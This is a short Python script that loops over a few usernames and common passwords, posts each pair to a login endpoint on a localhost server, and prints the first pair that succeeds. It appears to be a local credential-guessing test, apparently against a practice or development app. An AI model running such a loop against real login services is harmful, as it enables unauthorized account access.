import requests

BASE_URL = "http://localhost:5001"

users = ["riya@gmail.com", "saurabh@gmail.com", "admin"]
passwords = ["Welcome@123", "password123", "Admin@123"]

for user in users:
    for pwd in passwords:
        r = requests.post(f"{BASE_URL}/auth/login", json={"username": user, "password": pwd})
        if r.status_code == 200:
            print(f"Success: {user} / {pwd}")
            exit(0)
print("No credentials found")
